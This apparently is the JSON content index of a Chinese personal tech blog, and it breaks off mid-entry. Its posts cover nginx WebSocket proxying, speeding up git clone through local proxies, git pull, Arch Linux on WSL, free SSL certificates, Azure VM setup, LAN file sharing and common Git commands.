{"meta":{"title":"Boo","subtitle":"","description":"","author":"Boo","url":"https://www.0x2BeAce.com","root":"/"},"pages":[{"title":"404 Not Found","date":"2020-07-05T02:30:21.578Z","updated":"2020-07-05T02:30:21.578Z","comments":true,"path":"404.html","permalink":"https://www.0x2beace.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"关于我","date":"2020-08-15T01:56:27.151Z","updated":"2020-08-15T01:56:27.151Z","comments":true,"path":"about/index.html","permalink":"https://www.0x2beace.com/about/index.html","excerpt":"","text":"关于此博客博客名：0x2BeAce 读作 To Be Ace。 Ace 有多个意思，这里取 a person who is very skilled at something 。 专门用于技术分享，记录一些感兴趣的东西。 这里参考了 Soros Liu 的博客。 关于我游离于2.5 次元的伪全栈，Linux 爱好者。 你可以通过以下方式找到我： 博客 GitHub Eamil 豆瓣 - 记录书影 Weibo - 很久没更新了… Telegram"},{"title":"所有分类","date":"2020-07-05T02:57:23.853Z","updated":"2020-07-05T02:57:23.853Z","comments":true,"path":"categories/index.html","permalink":"https://www.0x2beace.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2020-07-05T03:12:46.301Z","updated":"2020-07-05T03:12:46.301Z","comments":true,"path":"mylist/index.html","permalink":"https://www.0x2beace.com/mylist/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2020-07-05T02:29:38.929Z","updated":"2020-07-05T02:29:38.929Z","comments":true,"path":"tags/index.html","permalink":"https://www.0x2beace.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Socket.io 连接异常：Error during WebSocket handshake Unexpected response code 400","slug":"socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400","date":"2020-08-23T02:34:50.000Z","updated":"2020-08-23T02:43:00.235Z","comments":true,"path":"socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/","link":"","permalink":"https://www.0x2beace.com/socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/","excerpt":"前段时间线上的生产环境遇到一个问题：Error during WebSocket handshake: Unexpected response code: 400。 起初我没太在意，以为就是正常的 socket.io 连接断开了。 直到我发现 socker.io 的通讯方式由原来的在一个连接中通讯变成了每一次推送都重起一个请求，我才意识到可能是哪里出问题了。","text":"前段时间线上的生产环境遇到一个问题：Error during WebSocket handshake: Unexpected response code: 400。 起初我没太在意，以为就是正常的 socket.io 连接断开了。 直到我发现 socker.io 的通讯方式由原来的在一个连接中通讯变成了每一次推送都重起一个请求，我才意识到可能是哪里出问题了。 nginx 作为wbsocket 代理经过一番查找，了解到 nginx 在作为反向代理时，如果需要使用 wss，那么还需要额外加一段配置。 NGINX supports WebSocket by allowing a tunnel to be set up between a client and a backend server. For NGINX to send the Upgrade request from the client to the backend server, the Upgrade and Connection headers must be set explicitly. —— Nginx 官网 翻译过来就是：nginx 通过允许在客户端和后端服务器之间建立连接来支持 websocket 通讯，为了使 nginx 将升级请求从客户端发送到后端服务器，必须明确设置 Upgrade 和 Connection 标头。 12345678location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;wsbackend; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;Upgrade&quot;; proxy_set_header Host $host;&#125; 第一行是 nginx 反向代理的配置，后面四行才是这个问题的解决方案。 仔细想一想，因为本地没有 https 的概念，并没有发现这个问题，而线上是有配置证书的，所以暴露出了这个问题。 总结socket.io 的请求并没有真正达到，请求发出之后中间为什么没有到达节点，这个是解决问题的关键。 为了使 nginx 正确处理 socket.io 所需要做的就是正确设置标头，以处理将连接从 http 升级到 websocket 的请求。 参考链接 Nginx 作为Websocket 反向代理","categories":[{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/categories/Socket-io/"},{"name":"Nginx","slug":"Socket-io/Nginx","permalink":"https://www.0x2beace.com/categories/Socket-io/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"},{"name":"wss","slug":"wss","permalink":"https://www.0x2beace.com/tags/wss/"}]},{"title":"Git Clone 太慢怎么办？","slug":"what-should-I-do-if-git-clone-is-too-slow","date":"2020-08-19T14:29:15.000Z","updated":"2020-08-19T15:02:03.396Z","comments":true,"path":"what-should-I-do-if-git-clone-is-too-slow/","link":"","permalink":"https://www.0x2beace.com/what-should-I-do-if-git-clone-is-too-slow/","excerpt":"今天在使用git 时，需要克隆Bitbucket的一个仓库，于是像往常一样打开了iTerm，便放在一边了。直到一个小时后，我才想起来，想着应该克隆完了，打开才发现百分之一都没下载完。","text":"今天在使用git 时，需要克隆Bitbucket的一个仓库，于是像往常一样打开了iTerm，便放在一边了。直到一个小时后，我才想起来，想着应该克隆完了，打开才发现百分之一都没下载完。 强大的长城技术对GitHub、Bitbucket 这类源代码托管服务平台网开一面，并没有像Google、FaceBook那样直接一刀切，但是它做了严格的限速，这种折磨简直比无法访问更难受。 上图中git clone的速度从来没有超过 10k/s，这也就意味着一个 100M 的项目，需要近三个小时才能下载完，而且由于网络的不稳定性，下载过程中偶尔会出现断开连接的情况，由于git clone 不支持端点续传，这就会导致前几个小时的下载量完全浪费掉了，只能重新开始下载。 这篇文章主要用来介绍几种方式可以快速的克隆远程仓库。 浅复制git clone默认会下载项目的完整历史版本，如果你只关心代码，而不关心历史信息，那么可以使用 git 的浅复制功能： 1$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;bcit-ci&#x2F;CodeIgniter.git --depth=1 表示只下载最近一次的版本，使用浅复制可以大大减少下载的数据量，例如，CodeIgniter 项目完整下载有近 100MiB ，而使用浅复制只有 5MiB 多，这样即使在恶劣的网络环境下，也可以快速的获得代码。 如果之后又想获取完整历史信息，可以使用下面的命令： 1$ git fetch --unshallow 或者，如果你只想下载最新的代码，你也可以直接从远程仓库下载打包好的zip文件，这会比浅复制更快，因为它只包含了最新的代码文件，而且zip是压缩文件。但是很显然，使用浅复制会灵活一些。 GUI 工具如果你有幸正在使用代理，懂得如何科学上网的话，那么访问GitHub、Bitbucket对你来说应该不在话下。 从源代码托管服务平台下载项目最简单的方法就是使用一款图形化界面（GUI）的Git工具。 使用GUI工具方便之处就在于，可以在设置中直接配置是否使用代理。或者直接将代理配置尾系统代理。 http/https proxy如果你跟我一样，更喜欢使用原生的git命令，喜欢使用在命令行下操作的那种感觉，那么你也可以在命令行下直接配置代理。 这里也有两种方式，根据实际情况自行选择。 http12$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087$ git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1087 或者直接编辑~/.gitconifg文件 123456# vim ~&#x2F;.gitconfig[http] proxy &#x3D; http:&#x2F;&#x2F;127.0.0.1:1087[https] proxy &#x3D; https:&#x2F;&#x2F;127.0.0.1:1087 socks512$ git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086$ git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086 其中，1087、1086分别是你本地机器的 http、socks5代理的端口号。 另外，如果想取消设置，可以输入以下命令： 12$ git config --global --unset http.proxy$ git conifg --global --unset https.proxy 配置完成后，重新 clone一遍，可以看到速度得到了极大的提升。 注意⚠️ 上面这种配置方式仅适用于 https协议，如果你在clone时选择ssh协议，那么速度仍然会很慢。 参考链接Git Clone 太慢怎么办？","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"},{"name":"Skill","slug":"Git/Skill","permalink":"https://www.0x2beace.com/categories/Git/Skill/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"}]},{"title":"如何让终端命令走代理？","slug":"how-to-make-terminal-commands-go-through-proxy","date":"2020-08-18T15:39:58.000Z","updated":"2020-08-18T15:43:24.093Z","comments":true,"path":"how-to-make-terminal-commands-go-through-proxy/","link":"","permalink":"https://www.0x2beace.com/how-to-make-terminal-commands-go-through-proxy/","excerpt":"问题描述：今天本来打算使用Homebrew 更新一个工具，但是输入完brew updata 之后，就一直是Updating Homebrew...","text":"问题描述：今天本来打算使用Homebrew 更新一个工具，但是输入完brew updata 之后，就一直是Updating Homebrew... 这个时候，我产生了几个疑问： 为什么卡着不动了，明明是有网络的啊。 难道是因为Homebrew 需要访问国外的源？ Shadowsocks 明明是开着全局代理，为什么没有用？ 如何让终端命令走代理，或者说如何让 Homebrew 走代理更新？ 方案首先先回答一下上面那些问题，因为国内网络环境进一步恶劣，使得从根本上造成了这个问题的产生。因为Shadowshocks的全局代理虽然对浏览器是有效，但对命令行无效。 所以这一切的问题可以总结成一个问题：如果能让终端命令走代理就好了。 好在Homebrew 是支持全局代理的，所以我们只需要在当前环境中加入代理配置就好了。 123export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080&#x2F;&#x2F; 1080 是本地 socks5 监听端口 如何知道终端命令有没有走代理？ 有一个很简单的方法，那就是通过Curl 命令： 1curl https:&#x2F;&#x2F;www.google.com 如果走了本地代理，那么很快终端就会有输出，如果没有走则会提示403 端口请求超时。 永久生效需要注意的是，上面的配置仅仅只是临时的，如果重启一下终端，这个配置就失效了，那么有没有办法可以永久生效呢？ 当然是有的，只需要将环境变量写入终端中。 12345# bashecho export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.bash_profile# zshecho export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.zsh_profile 这样，Homebrew 就能通过 Shadowsocks 来更新了。 参考链接 让 Homebrew 走代理更新 如何让Homebrew 走代理更新？","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Git Pull 命令详解","slug":"detailed-git-pull-command","date":"2020-08-17T15:34:26.000Z","updated":"2020-08-17T15:36:38.472Z","comments":true,"path":"detailed-git-pull-command/","link":"","permalink":"https://www.0x2beace.com/detailed-git-pull-command/","excerpt":"这片文章主要用来讲解git pull命令的一些细节。","text":"这片文章主要用来讲解git pull命令的一些细节。 git pullgit pull 的作用是：取回远程主机某个分支的更新，再与本地指定分支自动合并。 描述将远程主机中的更改合并到当前分支，在默认情况下git pull是git fetch命令和git merge Fetch_HEAD命令的合集，后面会详细介绍。 示例这是git pull 的完整格式： 1$ git pull [options] [&lt;repository&gt; [&lt;refspec&gt;…]] 比如要取回origin主机的fixbug分支的最新提交，并与本地的master分支合并，就需要写成这个样子： 1$ git pull origin fixbug:master 如果远程分支要与当前分支合并，则冒号及其冒号后的分支可以省略，就变成了这个样子： 12&#x2F;&#x2F; 取回firebug 分支的最新提交并与当前分支合并$ git pull origin fixbug 上面的命令表示，取回origin/fixbug分支最新的提交，并于当前分支合并。 这里就等同于先git fetch获取所跟踪的远程分支的最新的提交，然后执行git merge合并到当前分支。也就是下面两条命令。 12345&#x2F;&#x2F; 自动从当前分支的跟踪分支上获取最新的提交$ git fetch &#x2F;&#x2F; 合并origin&#x2F;fixbug分支到当前分支$ git merge origin&#x2F;fixbug git fetch 为什么这个分支是这种写法? 因为git fetch命令会获取当前追踪分支的最新更改，就等同于取回origin/fixbug分支到本地。 你可以使用git branch -a 查看所有分支，会发现多了一个 origin/fixbug分支，前提是该分支已经建立了追踪关系。 而这个分支所包含的内容就是最新的提交或者其他某些更改。所以此时你需要通过合并这个长的比较奇怪的分支，来更新本地的工作区。 在某些场合，Git 会自动在本地分支与远程分支之间建立一种追踪关系（tracking）。比如，我们在clone 时，会发现所有本地分支默认与远程主机的同名分支，建立追踪关系。也就是说，本地的 master 分支自动追踪 origin/master分支。 Git 也允许手动添加追踪关系。 12&#x2F;&#x2F; 本地master分支与取回origin&#x2F;fixbug分支建立关系。$ git branch --set-upstream master origin&#x2F;fixbug 如果当前分支与远程分支存在追踪关系。那么git pull 就可以省略远程分支名。 1$ git pull origin 上面的分支是什么意思呢？就是表示本地的当前分支会自动与对应的origin主机的“追踪分支”进行合并。 如果当前分支只对应一种追踪分支，那么远程主机名都可以省略。 12&#x2F;&#x2F; 这也就成了我们常看见的原始命令。$ git pull 上面的命令会自动的与唯一的追踪分支进行合并。 如何将远程分支作为本地的默认分支？ 1$ git branch --track &lt;remote branch&gt; remotes&#x2F;origin&#x2F;&lt;remote branch&gt; 这样就将远程的分支与本地同名分支建立了追踪关系。 可以使用git config -e命令查看。 当追踪关系只有一个时，那么使用git pull 命令，就可以直接更新&lt;remote branch&gt; 分支了。 如果合并需要采用rebase模式，可以使用--rebase选项。 git rebase 这里说一个题外话，rebase 是什么？有什么用？ git rebase 清除本地历史提交 1$ git --rebase &lt;远程主机名&gt;&lt;远程分支名&gt;:&lt;本地分支名&gt; git fetch 与 git pull 的区别。 git fetch 表示从远程获取最新的版本到本地，但是不会自动合并。其过程用命令表示就是： 123$ git fetch origin master$ git log -p master..origin&#x2F;master$ git merge origin&#x2F;master 另一种写法就是： 123$ git fetch origin master:tem$ git diff tem$ git merge tem 上面这两种写法都是都是一个意思。唯一有所区别的就是使用 tem分支代替了origin/master分支的存在。其含义是： 从远程origin主机的master主分支下载最新的版本到本地origin/master分支，或者tem分支。 比较本地master分支与origin/master（tem）分支的差异。 最后进行合并 git pull，相当于从远程获取最新的版本并合并到本地。 1$ git pull origin master 上述命令其实相当于git fetch 和 git merge在实际使用中，git fetch更安全一些，因为在merge前，我们可以查看更新情况，然后再决定是否合并。","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Win10 如何卸载 Arch Linux","slug":"how-to-uninstall-wsl-linux-subsystem-in-win-10","date":"2020-08-16T09:56:22.000Z","updated":"2020-08-23T02:46:19.997Z","comments":true,"path":"how-to-uninstall-wsl-linux-subsystem-in-win-10/","link":"","permalink":"https://www.0x2beace.com/how-to-uninstall-wsl-linux-subsystem-in-win-10/","excerpt":"最近在Windows 上安装 WSL，遇到一点问题，需要将 Arch Linux 完全卸载。","text":"最近在Windows 上安装 WSL，遇到一点问题，需要将 Arch Linux 完全卸载。 在正式卸载之前，有以下几点需要注意： 不要试图通过 Microsoft Store 去卸载，那里只有安装按钮，没有卸载按钮。 秋季创意者更新之前，可以使用lxrun命令去进行卸载操作，但是秋季创意者更新之后该命令就被移除了。 查看发行版列出当前已经安装且随时可用的发行版： 1wslconfig &#x2F;list 列出所有发行版，包括正在安装、卸载和已损坏的发行版： 1wslconfig &#x2F;list &#x2F;all 卸载卸载已经安装的发行版： 12345$ wslconfig &#x2F;list &#x2F;allWindows Subsystem for Linux Distributions:Arch (Default)$ wslconfig &#x2F;unregister ArchUnregistering... 上面是以Arch Linux为例进行卸载，其他发行版同理，只需要替换发行版的名称就可以了。 注意: 卸载发行版时，会永久删除所有与该发行版有关的数据和设置。 参考链接 Windows 10 Linux子系统如何卸载？","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"}]},{"title":"Win10 如何安装 Arch Linux","slug":"how-to-install-arch-linux-on-win10","date":"2020-08-16T09:50:09.000Z","updated":"2020-08-16T10:00:10.873Z","comments":true,"path":"how-to-install-arch-linux-on-win10/","link":"","permalink":"https://www.0x2beace.com/how-to-install-arch-linux-on-win10/","excerpt":"最近主力生产工具可能要拿去送修，所以可能有一段时间要和我的MBP 分开了。但是工作还是要继续，于是把之前闲置的 小米 Pro 15.6 给整起来。 第一件需要做的事情就是配置开发环境。","text":"最近主力生产工具可能要拿去送修，所以可能有一段时间要和我的MBP 分开了。但是工作还是要继续，于是把之前闲置的 小米 Pro 15.6 给整起来。 第一件需要做的事情就是配置开发环境。 了解 WSL什么是 WSL ？Windows Linux Server (WSL) 又名Windows 子系统，它使得开发人员可以直接在未经修改得Windows 上运行 Gun/Linux 环境，也包括大多数命令行工具，实用程序员和应用程序员，而不会需要额外增加虚拟机。 WSL 可以做什么 你可以自行选择你喜欢的 Gun/Linux 发行版：Arch Linux、Ubuntu、OpenSuSE、Kail Linux、Debian、Fedora等。 运行通用的命令行，例如grep，sed，awk或其他ELF-64二进制文件。 轻松运行Bash Shell脚本和 GNU/Linux 命令行应用程序 使用自己的 GNU/Linux 分发程序包管理器安装其他软件。 使用类似Unix的命令行外壳调用Windows应用程序。 在Windows上调用 GNU/Linux 应用程序。 有了这些功能，我们就可以完成很多工作，而不必担心安装虚拟机监控程序，从而享受Linux的好处。安装并准备好Win 10后，请按照以下步骤进行操作，并在其中添加Arch Linux。 安装 WSL本文要安装的WSL 是 Arch Linux 。 为什么要选择 Arch Linux？ 因为它是一个轻量级且灵活的Linux 发行版。 为Linux 安装Windows 子系统这是一项使Windows能够“ 托管 ” Linux 的功能。所以需要先启用此功能。 以管理员的身份打开Power Shell，然后输入以下命令： 1Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux 通常会重启一次你的电脑。 安装Arch Linux我记得在2019 年，Windows 刚拥抱 Linux 时，Arch Linux 还可以直接从 Microsoft Store 直接下载，不知为何现在却搜不到了。 不过还是有其他办法手动安装，打开该页面，下载Arch.zip。 解压完成之后，可以看到如下文件： 双击Arch.exe应用程序，进行安装。 稍微等待一会，就可以看到Arch Linux 已经顺利安装完成了，然后按任意键退出。 启动Arch Linux再次双击Arch Linux，不出意外的话，就可以看到Arch Linux 的控制台了，没错就是这么简单。 配置第一次安装完成之后，需要手动做一些配置，初始化并更新系统。 在终端或CMD 中输入WSL 进入Arch Linux。 编辑 /etc/pacman.d/mirrorlist，去掉China节点 前面的##，以及下面的Server下面的##。 初始化123pacman-key --initpacman-key --populate archlinux 更新12345&#x2F;&#x2F; 更新 GPG keypacman -Sy archlinux-keyring&#x2F;&#x2F; 更新系统，速度快慢与镜像源有关pacman -Syyu base base-devel 个性化Arch Linux 默认的样式并不好看，和CMD 都是黑漆漆的一片。 因为Arch Linux 默认使用的 Bash，如果你和我一样，更喜欢 Zsh 的话，那就请继续看下去。 安装ZSH既然要安装Zsh，那就不得不安装oh-my-zsh了，所以这里一起安装了。 1pacman -S zsh oh-my-zsh-git 安装Spaceship ZSHSpaceship ZSH 是Zsh 的提示符工具。 克隆仓库 1git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot; 链接文件 1ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot; 更改默认theme 12# vim ~&#x2F;.zshrcZSH_THEME&#x3D;&quot;spaceship&quot; 重启终端即可。 参考链接 安装ArchWSL（Windows 下的Arch Linux 子系统）","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"WSL","slug":"WSL","permalink":"https://www.0x2beace.com/tags/WSL/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"}]},{"title":"如何申请免费的SSL 证书","slug":"how-to-apply-for-a-free-ssl-certificate","date":"2020-08-14T10:03:13.000Z","updated":"2020-08-14T10:06:35.792Z","comments":true,"path":"how-to-apply-for-a-free-ssl-certificate/","link":"","permalink":"https://www.0x2beace.com/how-to-apply-for-a-free-ssl-certificate/","excerpt":"这篇笔记用来记录如何申请免费的 SSL 证书，通过本文介绍的方式所申请的证书有效期只有三个月，请谨慎选择。","text":"这篇笔记用来记录如何申请免费的 SSL 证书，通过本文介绍的方式所申请的证书有效期只有三个月，请谨慎选择。 准备像这类提供免费 SSL 证书的网站非常多，这里我选择的平台是 FreeSSL.cn 。 在正式开始之前，你得准备一个邮箱，注册 一个 FreeSSL.cn 账号，然后登录。 将需要申请证书的域名填写在输入框中，选择多域名通配符，然后点击创建免费的SSL 证书。 我这里选择的是泛域名，根据你自己的实际情况，去创建相应子域名的证书： example.com：主域名 *.example.com：泛域名 选择浏览器生成。 点击确认创建。 添加TXT 记录打开需要申请 SSL 证书的域名管理后台，找到 DNS 管理。 添加 TXT 验证，将刚才的记录值与TXT 记录添加到对应的TXT 类型。 注意⚠️：记录值区分大小写。 检测是否配置成功。 在完成验证之前不要离开当前页面，验证成功之后，点击验证。 如果配置成功没问题，就可以点击验证，下载证书就完成了。 注意⚠️：使用此方式获取的证书，有效期只有三个月。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"}]},{"title":"手把手教你如何创建启动 Azure 实例","slug":"teach-you-how-to-create-and-start-an-azure-instance","date":"2020-08-12T15:49:19.000Z","updated":"2020-08-15T02:06:48.502Z","comments":true,"path":"teach-you-how-to-create-and-start-an-azure-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-create-and-start-an-azure-instance/","excerpt":"这篇笔记用来整理如何创建启用 Azure 实例。因为这方面可以找到的资料比较少，所以整理一下。 一是方便自己以后回顾，二是给其他人作为参考。","text":"这篇笔记用来整理如何创建启用 Azure 实例。因为这方面可以找到的资料比较少，所以整理一下。 一是方便自己以后回顾，二是给其他人作为参考。 准备因为本文是创建微软云，所以首先你得有一个微软账号。 打开 Microsoft Azure 进行登录，登录成功之后，进入云服务管理后台。 创建实例点击创建资源。 可以搜索你想创建的云服务类型，这里我选择的是 Ubuntu Server 18.04 LTS。 点击创建。 放心，这里的创建并不是正真意义上的创建。接下来需要为机器预设配置。 下面对常见的配置进行简单说明： 资源组：用来分配一些权限以及策略。 虚拟机名称：你希望用什么名称来称呼这台机器（通常是英文） 区域：选择机器所在地区 映像：选择操作系统 大小：选择一个合适的负责类型，可以理解成机器的硬件配置。 身份验证类型：通常有两种：ssh 密钥和密码，强烈建议使用密钥而不使用密码（密哦存在被暴力破解的风险）。 用户名：微软云默认没有给root 用户，这里需要指定用户名称。 公共入站端口：通常是只开启HTTP (80)、HTTPS (443)、SSH (22) 。 完成基本配置之后，点击下一步：磁盘。 Azure 默认只有一个用于短期存储的临时盘，而临时盘通常都很小。 默认的磁盘很小，如果想扩大有两种方式： 创建新的磁盘，需要手动挂载。 更改默认磁盘的大小。 配置完磁盘之后，点击下一步：网络。 网络配置，公用ip 可以选择无，后面再去新建。 然后点击下一步：管理。 管理、高级、标记这一块，如果没有特殊需求可以直接使用默认配置。 最后点击查看+创建，可以看到预设的配置信息，如果符合预期，点击创建。 下载私钥并保存好。 此时，虽然已经创建好虚拟机，但是还不能直接使用，因为没有配置IP。 关联IPAzure 和 AWS 不同，它并没有弹性IP 的概念，如果需要配置IP，需要在搜索栏中搜索公共IP地址， 点击第一个搜索结果。 点击添加。 配置IP 基本信息，然后点击创建。 此时，只是创建了内网IP，并没有与外网IP 地址进行关联， 点击刚才新建的公共 IP 地址，点击配置。 资源类型选择网络接口，网络接口与对应的实例进行关联。 关联成功之后，就可以进行连接了。 连接 打开终端 请确保你对私钥具有只读访问权限。 1chmod 400 &lt;私钥&gt; 运行以下示例命令以连接到 VM。 1ssh -i &lt;私钥路径&gt; user@ip_address user：表示VM 用户 ip_address：表示外网IP 地址 扩大默认磁盘大小上面简单提到过，如果想要扩大默认磁盘的大小，有两种方式： 添加新磁盘。这种方式需要手动挂载，如果对linux 并不熟悉，这种方式不推荐新手用户使用。 更改默认磁盘大小。 第二种方式并不能直接更改，需要先将服务器停掉（注意⚠️：不是删除）。 搜索磁盘，点击第一个搜索结果。 点击需要扩大的磁盘实例，注意：只能扩大，不能缩小。 然后点击保存即可。 总结至此，就已经完成了Azure 的创建了，这方面需要学习的还有很多，这里只是简单的整理了一下自己遇到的问题。 有些地方可能没说清楚，但如果能帮到你那真是太好了","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Windows 和 Mac 在局域网内如何共享文件？","slug":"how-do-windows-and-mac-share-files-in-the-local-area-network","date":"2020-08-11T14:11:18.000Z","updated":"2020-08-13T11:43:07.419Z","comments":true,"path":"how-do-windows-and-mac-share-files-in-the-local-area-network/","link":"","permalink":"https://www.0x2beace.com/how-do-windows-and-mac-share-files-in-the-local-area-network/","excerpt":"每当手上有两台或多台电脑时，如果想传送一个文件，第一个想到的就是微信、QQ等这类工具。如果碰到了大一点的文件，就得换成网盘或者移动硬盘。 身为一个做开发者，这种做法比较low，所以找了几篇文章学习到了如何在局域网内共享文件。","text":"每当手上有两台或多台电脑时，如果想传送一个文件，第一个想到的就是微信、QQ等这类工具。如果碰到了大一点的文件，就得换成网盘或者移动硬盘。 身为一个做开发者，这种做法比较low，所以找了几篇文章学习到了如何在局域网内共享文件。 准备这里准备的是用 Windows 作为主机创建共享文件。 首先要确认准备传输文件的 Windows 和 Mac 是在同一个路由器组成的局域网内。 然后打开 Windows 的文件资源管理器，在其根目录下创建一个共享文件夹，名称随意，自己知道就好了。 右键文件夹，点击属性，找到 共享 Tab，点击高级共享。 勾选共享此文件夹，点击确定。 然后回到共享文件夹，右键点击属性，找到共享，选择用户。 如果允许其他人写入，则选择 Everyone，更改为：读取/写入。 访问Windows 本机访问123# ComputerName 表示：你的计算机名称# ShareFolders 表示：共享文件夹名称file:&#x2F;&#x2F;ComputerName&#x2F;ShareFolders&#x2F; Mac 局域网访问Mac 有两种方式： 通过浏览器访问 通过访达访问，使用快捷键 ⌘ + k123# ComputerName 表示：需要访问的计算机名称# ShareFolders 表示：共享文件夹名称smb:&#x2F;&#x2F;ConputerName&#x2F;ShareFolders&#x2F; 通过验证之后，就能访问到共享文件夹了。 到这里应该就能顺利的在两个或多个电脑之间传输文件了。 如果还不能访问，可以ping 一下对方的主机，如果没有ping通，检查一下防火墙设置。 如果防火墙关着，那么会 ping 不通。 参考链接 Windows 和 Mac 在局域网内如何共享文件？ 共享文件夹 一个实现Windows和Mac之间文件互传的简单方法","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"},{"name":"Windows","slug":"Skill/Windows","permalink":"https://www.0x2beace.com/categories/Skill/Windows/"},{"name":"Mac","slug":"Skill/Windows/Mac","permalink":"https://www.0x2beace.com/categories/Skill/Windows/Mac/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Git 常用命令参考手册","slug":"git-common-command-reference-manual","date":"2020-08-11T01:22:19.000Z","updated":"2020-08-11T01:24:32.528Z","comments":true,"path":"git-common-command-reference-manual/","link":"","permalink":"https://www.0x2beace.com/git-common-command-reference-manual/","excerpt":"虽然每天都在使用Git，但是有些命令太久不使用，还是会忘记，所以这篇笔记的目的就是整理那些Git 常用命令。","text":"虽然每天都在使用Git，但是有些命令太久不使用，还是会忘记，所以这篇笔记的目的就是整理那些Git 常用命令。 基础配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 1234567891011121314151617181920# 查看全局配置列表$ git config --global --list# 查看局部配置列表$ git config --local --list# 设置全局用户名&#x2F;邮箱$ git config --global user.name &quot;yourName&quot;$ git config --global user.email &quot;example@example.com&quot;# 设置本地当前工作区仓库用户名&#x2F;邮箱$ git config --local user.name &quot;yourName&quot;$ git config --local user.email &quot;example@example.com&quot;# 将默认文本编辑器设置为 emacs&#x2F;vim$ git config --global core.editor emacs&#x2F;vim# 编辑当前仓库的配置文件$ git config -e # 等价与 vim .git&#x2F;config# 编辑全局配置文件$ git config --global -e 命令别名配置12345678# 添加别名 git st &#x3D; git status$ git config --global alias.st status# 删除 st 别名$ git config --global --unset alias.st# 执行外部命令, 只要在前面加 ! 即可$ git config --global alias.st &#39;!echo hello&#39;; 代理配置如果想知道关于Git配置代理的更多信息，可以查阅这篇笔记。 1234567891011# 配置HTTP&#x2F;HTTPS 代理$ git config --global https.proxy http:&#x2F;&#x2F;127.0.0.1:1087$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087# 查看$ git config --global --get http.proxy$ git config --global --get https.proxy# 取消代理$ git config --global --unset http.proxy$ git config --global --unset https.proxy 生成SSHKey关于如何配置ssh config 可以查阅这篇笔记。 12345# 将ssh key生成在默认下，也就是&#96;~&#x2F;.ssh&#x2F;id_rsa&#96;。$ ssh-keygen -t rsa -C &quot;youremail&quot;# 将ssh key生成在指定路径下的指定文件名中$ ssh-keygen -t rsa -f ~&#x2F;.ssh&#x2F;id_rsa_bitbucket -C &quot;youremail&quot; 准备工作1234567891011# 在当前目录新建一个Git代码库$ git init# 新建一个目录，将其初始化为Git代码库$ git init [project-name]# 